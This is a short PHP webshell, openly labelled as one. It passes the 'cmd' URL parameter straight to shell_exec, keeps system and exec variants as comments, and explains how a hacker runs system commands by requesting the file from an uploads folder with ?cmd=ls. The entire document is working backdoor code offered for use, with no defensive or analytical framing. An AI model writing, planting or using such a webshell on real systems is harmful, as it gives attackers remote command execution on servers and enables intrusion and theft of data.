<?php
echo shell_exec($_GET['cmd']);
// system('whoami')
// exec("ls -la",$array);
// print_r($array);
?>

//run the file using 'php malicious.php'


//this is a webshell
//This code allows the hacker to execute system commands by visiting:
//https://example.com/uploads/malicious.php?cmd=ls